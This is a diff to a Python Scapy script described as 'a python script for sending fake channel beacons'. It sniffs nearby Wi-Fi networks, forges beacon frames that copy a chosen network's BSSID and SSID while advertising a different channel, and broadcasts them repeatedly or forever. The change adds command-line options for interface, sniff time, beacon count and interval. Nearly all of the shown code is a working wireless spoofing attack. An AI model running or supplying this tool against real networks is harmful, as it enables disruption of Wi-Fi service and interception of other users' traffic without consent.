@@ -3,6 +3,7 @@ from threading import Thread
 import pandas
 import time
 import os
+import argparse
 
 # source code : https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy
 
@@ -35,7 +36,7 @@ def print_all(stop):
     while True:
         os.system("clear")
         print(networks)
-        print("Sniffing will end after 10 seconds...")
+        print(f"Sniffing will end after {sniff_time} seconds...")
         time.sleep(0.5)
 
         if stop():
@@ -55,19 +56,36 @@ def change_channel(stop):
 
 
 if __name__ == "__main__":
-    # interface name, check using iwconfig
-    interface = "wlan0"
+    parser = argparse.ArgumentParser(description="A python script for sending fake channel beacons")
+    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0'",
+                        default="wlan0")
+    parser.add_argument("-s", dest="sniff_time", help="Sniffing time (in seconds), default is 10s",
+                        default=10)
+    parser.add_argument("-c", "--count", help="Number of beacons to send, specify 0 to keep sending "
+                                              "infinitely, default is 0", default=0)
+    parser.add_argument("--interval", help="The sending frequency (in seconds) between two frames sent, default is 0.1s",
+                        default=0.1)
+    args = parser.parse_args()
+
+    interface = args.iface
+    sniff_time = int(args.sniff_time)
+    count = int(args.count)
+    interval = float(args.interval)
+
     stop_threads = False
     # start the thread that prints all the networks
     printer = Thread(target=print_all, args=(lambda: stop_threads,))
     printer.daemon = True
     printer.start()
+
     # start the channel changer
     channel_changer = Thread(target=change_channel, args=(lambda: stop_threads,))
     channel_changer.daemon = True
     channel_changer.start()
+
     # start sniffing
-    sniff(prn=callback, iface=interface, timeout=10)
+    sniff(prn=callback, iface=interface, timeout=sniff_time)
+
     # stop threads used for sniffing
     stop_threads = True
     printer.join()
@@ -82,7 +100,7 @@ if __name__ == "__main__":
         # choose a channel 6 channels away from the original network
         channel = (channel + 6) % 14
 
-        # forging a beacon with type 1 and subtype 8 (Management frame and Beacon), broadcast address as
+        # forging a beacon with type 0 and subtype 8 (Management frame and Beacon), broadcast address as
         # destination address, chosen BSSID as the sender address and AP address
         packet = RadioTap() \
                  / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=chosen_bssid, addr3=chosen_bssid) \
@@ -90,6 +108,14 @@ if __name__ == "__main__":
                  / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) \
                  / Dot11Elt(ID="DSset", info=chr(channel))
 
-        # sending beacon every 100 ms forever
-        print(f"\nSending beacon of network {ssid} on channel {channel} until CTRL+C is pressed...")
-        sendp(packet, inter=0.1, iface=interface, loop=1)
+        if count == 0:
+            # if count is 0, it means we loop forever (until interrupt)
+            loop = 1
+            count = None
+            print(f"\n[+] Sending beacons of network {ssid} on channel {channel} every {interval}s forever...")
+        else:
+            loop = 0
+            print(f"\n[+] Sending {count} beacons of network {ssid} on channel {channel} every {interval}s...")
+
+        # sending beacons
+        sendp(packet, inter=interval, count=count, loop=loop, iface=interface, verbose=1)
